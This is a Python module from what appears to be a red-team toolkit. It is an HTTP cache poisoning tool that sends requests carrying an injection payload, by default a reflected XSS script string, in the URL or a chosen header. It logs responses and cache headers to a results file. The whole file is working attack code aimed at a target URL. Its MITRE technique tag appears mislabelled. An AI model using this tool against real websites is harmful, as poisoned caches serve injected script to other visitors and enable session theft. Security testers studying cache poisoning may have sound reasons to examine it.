# modules/attacks/http_cache_poisoner.py

import requests
import argparse
import json
import os
from datetime import datetime
from urllib.parse import urlparse

LOG_FILE = "results/cache_poison_results.json"
MITRE_TTP = "T1600"

def log_result(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def poison_cache(url, payload, header_key=None):
    headers = {
        "User-Agent": "REDOT-CachePoisoner"
    }

    if header_key:
        headers[header_key] = payload

    poisoned_url = url + payload if not header_key else url
    try:
        r = requests.get(poisoned_url, headers=headers, timeout=5)
        log_result({
            "timestamp": datetime.utcnow().isoformat(),
            "target_url": url,
            "header_key": header_key,
            "payload": payload,
            "status": r.status_code,
            "cache_headers": dict(r.headers),
            "ttp": MITRE_TTP
        })
        print(f"[+] Sent poison request: {poisoned_url}")
        print(f"[+] Response: {r.status_code}")
        return r.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return ""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Cache Poisoning Exploit Tool")
    parser.add_argument("--url", required=True, help="Target URL (e.g. https://victim.com/page)")
    parser.add_argument("--payload", default="?cb=<script>alert(1)</script>", help="Injection payload")
    parser.add_argument("--header", help="Header to inject poison into (optional)")
    args = parser.parse_args()

    poison_cache(args.url, args.payload, args.header)
